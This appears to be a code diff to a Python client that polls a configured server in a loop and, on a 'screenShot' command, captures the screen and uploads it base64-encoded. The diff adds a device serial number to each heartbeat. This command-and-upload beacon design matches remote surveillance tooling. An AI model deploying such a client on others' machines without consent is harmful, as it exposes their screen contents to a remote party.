@@ -11,6 +11,7 @@ from requests import post
 from time import sleep
 from configparser import ConfigParser
 
+
 Config = ConfigParser()
 Config.read("config.ini")
 
@@ -31,14 +32,15 @@ def screen_shot(save_path):
     image = b64encode(open(save_path,'rb').read())
     return image
 
-def main():
+def main(serialNumber):
     data = {
-        'transferType' : 'heartBeat'
+        'transferType' : 'heartBeat',
+        'serialNumber' : serialNumber
     }
     try:
         receive_data = post(url,data).text
     except:
-        main()
+        receive_data = 'heart'
 
     if receive_data == 'screenShot':
         image = screen_shot(save_path)
@@ -52,6 +54,7 @@ def main():
         post(url,post_data)
 
 if __name__ == '__main__':
+    serialNumber = serial_number()
     while True:
-        main()
+        main(serialNumber)
         sleep(0.2)
